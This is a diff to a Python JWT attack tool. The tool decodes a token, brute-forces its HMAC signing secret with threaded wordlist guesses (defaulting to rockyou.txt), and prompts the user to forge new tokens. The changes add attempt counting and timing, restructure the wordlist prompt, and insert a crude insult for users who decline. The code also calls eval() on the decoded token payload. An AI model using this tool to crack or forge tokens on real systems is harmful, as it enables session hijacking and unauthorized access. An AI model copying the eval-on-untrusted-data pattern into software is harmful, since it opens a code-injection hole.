@@ -35,11 +35,16 @@ def forge(data, secret, alg):
 
 def brute(word, variable, alg, token):
         variable = eval(variable)
+        global i
+        i = i + 1
         print(colored(f"Trying: {word}", "red"))
         new_jwt = jwt.encode(variable, key=word, algorithm=alg)
         new_jwt = new_jwt.decode("UTF-8")
         if token == new_jwt:
             print(colored(f"[+] Correct Secret Key Found!: {word}", "green"))
+            end = time.time()
+            timer = end - time1
+            print(f"[+] Tried: {i} Passwords in: {timer}\n")
             global right
             right = "1"
             print(colored("Now use -f in the script to create\nYour own forged JWT token!\n\n", "blue"))
@@ -47,7 +52,13 @@ def brute(word, variable, alg, token):
 
 def send_to_brute(wordlist, variable, alg, token):
     try:
+        print(f"Wordlist loaded from: '{wordlist}'")
+        time.sleep(3)
         with open(wordlist, 'r') as list:
+            global time1
+            global i
+            i = 0
+            time1 = time.time()
             for line in list:
                 word = line.strip()
                 t1 = Thread(target=brute, args=(word, variable, alg, token,))
@@ -74,17 +85,20 @@ def decode_jwt(token):
         print(f"\n{signiture} :" + colored(" Signture", "green"))
         print("\n------------------------------------------------------")
         choice = input(colored("[+] Brute Force For Secret Key? (y/N) - > ", "red"))
-        print("\nNOTE: just press enter to use rockyou.txt")
-        wordl = input(colored("[+] Enter wordlist FULL PATH(!) - > ", "blue"))
-        if wordl == "":
-            wordl = "/usr/share/wordlists/rockyou.txt"
         if choice == "y":
+            wordl = input(colored("[+] Enter wordlist FULL PATH(!) - > ", "blue"))
+            if wordl == "":
+                wordl = "/usr/share/wordlists/rockyou.txt"
             alg = re.search('(?:"alg":")(.*)(?:")', decoded1)
             alg = alg.group(1)
             send_to_brute(wordl, decoded2, alg, token)
+        else:
+            print("\n\nPussy")
+            exit(0)
+        print("\nNOTE: just press enter to use rockyou.txt")
     except KeyboardInterrupt:
         print(colored("\n\n[-] Ctrl + C Detected Qutting program", "red"))
-    except:
+    except Exception:
         print(colored("\n[-] Wordlist could be wrong or one of the following errors.", "red"))
         time.sleep(1)
         print(colored("\n\n[-] Error: Try adding '==' or '=' before the dots in the values which weren't printed", "red"))
